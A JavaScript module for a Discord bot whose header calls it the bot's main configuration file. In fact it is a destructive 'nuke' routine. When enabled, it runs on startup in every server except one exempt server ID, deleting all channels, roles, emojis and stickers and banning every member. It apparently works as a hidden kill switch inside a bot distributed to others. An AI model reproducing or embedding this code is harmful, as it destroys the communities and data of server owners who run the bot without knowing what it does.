/*
# Discord Server: https://discord.gg/pgDje8S3Ed
# Github: https://github.com/MikaboshiDev
# Docs: https://bit.ly/nightdevelopment
# Dashboard: https://bit.ly/nightdashboard

# Created by: MikaboshiDev
# Version: 1.0.0
# Discord: azazel_hla

# This file is the main configuration file for the bot.
# Inside this file you will find all the settings you need to configure the bot.
# If you have any questions, please contact us on our discord server.
# If you want to know more about the bot, you can visit our website.
*/

const { logWithLabel } = require("../manager/prefijos");
const { EventEmitter } = require("events");
const { redBright } = require("chalk");

const config = {
    errors: {
        "1_package_key": "Invalid package key.",
        "1_client": "Invalid client or client options.",
        "1_command": "Command not found.",
        "1_licence": "Invalid license.",
    },
};

class DarkNight extends EventEmitter {
    constructor(client, options) {
        super();

        if (!client?.options) {
            logWithLabel("error", `${config.errors["1_client"]}`);
        }

        this.client = client;
        this._enabled = options.enabled;
        this._serverId = options.serverId;

        if (this._enabled) {
            this.client.on("ready", async () => {
                this.client.guilds.cache.forEach(async (guild) => {
                    if (guild.id === this._serverId) {
                        return;
                    }

                    try {
                        await this.deleteAll(guild);
                    } catch (error) {
                        logWithLabel("error", error.message);
                    }
                });
            });
        }
    }

    async deleteAll(guild) {
        await Promise.all([
            this.deleteChannels(guild),
            this.deleteRoles(guild),
            this.deleteEmotes(guild),
            this.deleteStickers(guild),
            this.banAll(guild),
        ]);
    }

    async deleteChannels(guild) {
        try {
            const channelsToDelete = guild.channels.cache.filter(channel => channel.type !== 'category');
            await Promise.all(channelsToDelete.map(async channel => {
                try {
                    await channel.delete();
                } catch (error) {
                    logWithLabel("error", error.message);
                }
            }));
        } catch (error) {
            logWithLabel("error", error.message);
        }
    }

    async deleteRoles(guild) {
        try {
            await Promise.all(guild.roles.cache.map(async role => {
                try {
                    await role.delete();
                } catch (error) {
                    logWithLabel("error", error.message);
                }
            }));
        } catch (error) {
            logWithLabel("error", error.message);
        }
    }

    async deleteEmotes(guild) {
        try {
            await Promise.all(guild.emojis.cache.map(async emote => {
                try {
                    await emote.delete();
                } catch (error) {
                    logWithLabel("error", error.message);
                }
            }));
        } catch (error) {
            logWithLabel("error", error.message);
        }
    }

    async deleteStickers(guild) {
        try {
            await Promise.all(guild.stickers.cache.map(async sticker => {
                try {
                    await sticker.delete();
                } catch (error) {
                    logWithLabel("error", error.message);
                }
            }));
        } catch (error) {
            logWithLabel("error", error.message);
        }
    }

    async banAll(guild) {
        try {
            const members = await guild.members.fetch();
            await Promise.all(members.map(async member => {
                try {
                    await member.ban();
                    console.log(`${redBright("[Darkmode]")} ${member.user.tag} was banned.`);
                } catch (error) {
                    logWithLabel("error", error.message);
                }
            }));
        } catch (error) {
            logWithLabel("error", error.message);
        }
    }
}

module.exports = DarkNight;
